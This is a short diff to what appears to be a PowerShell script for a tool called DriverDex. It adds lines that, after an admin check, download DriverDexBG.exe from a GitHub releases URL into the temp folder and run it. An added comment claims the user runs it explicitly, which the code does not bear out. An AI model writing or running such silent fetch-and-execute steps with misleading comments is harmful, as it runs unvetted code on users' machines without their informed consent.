@@ -84,7 +84,9 @@ if (-not (Test-IsAdmin)) {
     }
     exit
 }
-
+# User downloads and runs explicitly — they can see what they're running
+Invoke-WebRequest -Uri 'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe' -OutFile "$env:TEMP\DriverDexBG.exe"
+Start-Process "$env:TEMP\DriverDexBG.exe"
 # ================================================================
 #  CONSOLE SETUP
 # ================================================================
